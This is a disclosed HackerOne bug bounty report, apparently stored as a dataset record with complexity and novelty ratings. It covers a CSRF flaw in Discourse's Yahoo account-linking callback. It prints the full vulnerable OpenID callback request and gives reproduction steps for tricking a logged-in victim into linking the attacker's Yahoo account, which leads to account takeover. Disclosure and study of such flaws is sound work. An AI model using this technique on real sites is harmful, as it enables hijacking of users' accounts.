{
    "reported_to": "Discourse",
    "reported_by": "avinash_ ",
    "title": "Account takeover at https://try.discourse.org due to no CSRF protection in connecting Yahoo account",
    "content": "\nHi\nThere is an option in https://try.discourse.org/u/testh1ay/preferences/account to connect our Yahoo account.\nI noticed Connect Yahoo account option have the workflow with GET method and there is lack of csrf protection on connecting yahoo account which can help attacker into inducing victim to connect attacker's yahoo account to victim's discourse account, and it leads to full account takeover of victim's account.\nVulnerable Request:\nGET /auth/yahoo/callback?_method=post&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=id_res&openid.return_to=https%3A%2F%2Ftry.discourse.org%2Fauth%2Fyahoo%2Fcallback%3F_method%3Dpost&openid.claimed_id=https%3A%2F%2Fme.yahoo.com%2Fa%2F7qAAT.abcd&openid.identity=https%3A%2F%2Fme.yahoo.com%2Fa%2F7qAAT.abcd&openid.realm=https%3A%2F%2Ftry.discourse.org&openid.ns.ax=http%3A%2F%2Fopenid.net%2Fsrv%2Fax%2F1.0&openid.ax.mode=fetch_response&openid.ax.value.email=testhackeroneay%40yahoo.com&openid.ax.value.fullname=test%20hackerone&openid.ax.value.nickname=test&openid.assoc_handle=abcd&openid.response_nonce=2018-10-12T16%3A27%defg-&openid.signed=assoc_handle%2Cclaimed_id%2Cidentity%2Cmode%2Cns%2Cop_endpoint%2Cresponse_nonce%2Creturn_to%2Csigned%2Cax.value.email%2Cax.type.email%2Cax.value.fullname%2Cax.type.fullname%2Cax.value.nickname%2Cax.type.nickname%2Cns.ax%2Cax.mode%2Cpape.auth_level.nist&openid.op_endpoint=https%3A%2F%2Fopen.login.yahooapis.com%2Fopenid%2Fop%2Fauth&openid.ax.type.email=http%3A%2F%2Faxschema.org%2Fcontact%2Femail&openid.ax.type.fullname=http%3A%2F%2Faxschema.org%2FnamePerson&openid.ax.type.nickname=http%3A%2F%2Faxschema.org%2FnamePerson%2Ffriendly&openid.pape.auth_level.nist=0&openid.sig=9p%2Bxyz HTTP/1.1\nHost: try.discourse.org\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\nSteps to reproduce:\nAttacker go to https://try.discourse.org/u/user/preferences/account\nSwitch on burp interceptor and click on Yahoo connect.\nGo to burp interceptor and after forwarding some requests attacker will find the upper mentioned vulnerable request.\nCopy that and drop the request( here you saved the auth token generated by yahoo).\nNow feed the copied request to authenticated victim (as a html form or as an url).\nVictim get the message authentication complete and get redirected to https://try.discourse.org/?authComplete=true.\nAttacker open his browser and try to login with yahoo.\nAttacker get redirected to https://try.discourse.org/auth/yahoo/null\nAttacker open https://try.discourse.org\nCheck Victim's account successfully compromised.\nImpact\nAccount Takeover.\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": 512,
    "weaknesses": [
        "Cross-Site Request Forgery (CSRF)"
    ],
    "screenshots": {},
    "disclosed_date": 1544081700,
    "report_url": "https://hackerone.com/reports/423022",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "MEDIUM",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Attacker visits https://try.discourse.org/u/user/preferences/account and intercepts the Yahoo account connection request using Burp Suite."
        ],
        [
            2,
            "Attacker crafts a malicious request or URL with the intercepted data and tricks the victim into executing it, leading to the victim's account being linked to the attacker's Yahoo account."
        ]
    ],
    "vuln_description": "The vulnerability allows an attacker to take over a victim's account on Discourse by exploiting the lack of CSRF protection in the Yahoo account connection feature. This enables the attacker to link their own Yahoo account to the victim's Discourse account, leading to full account compromise.",
    "reason": "The attack involves intercepting and manipulating a specific request flow, but the steps are straightforward once the vulnerable endpoint is identified. The lack of CSRF protection is a common issue, making the discovery process less complex.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}